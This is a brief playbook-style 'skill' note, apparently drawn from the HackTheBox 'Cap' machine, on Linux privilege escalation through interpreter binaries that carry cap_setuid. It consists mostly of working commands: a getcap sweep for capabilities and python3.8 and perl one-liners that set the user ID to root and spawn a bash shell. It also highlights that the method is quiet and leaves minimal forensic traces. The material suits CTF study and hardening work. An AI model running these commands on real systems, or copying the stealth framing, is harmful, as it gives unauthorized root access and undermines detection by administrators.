# Skill: Interpreter binary with cap_setuid -> instant root

From: HTB cap. Trigger: Linux box, already have low-priv shell.

```bash
getcap -r / 2>/dev/null        # or: find / -perm -4000 -o -cap  -type f 2>/dev/null
```

If an interpreter (python/perl/ruby/node) shows `cap_setuid` (also check
`cap_setgid`, `cap_dac_override`, `cap_sys_admin`):

```bash
python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
# perl equivalent: perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'
```

Notes
- Works with NO sudo; bypasses `sudo -l` dead ends.
- `cap_setuid+eip` (effective+inheritable) is what matters; all three is fine.
- Quiet: no cron/service modification, minimal forensics.
- Also sweep capabilities on every binary in PATH, not just interpreters —
  on Python-versioned boxes (python3.8 vs 3.10) only one binary may carry it.
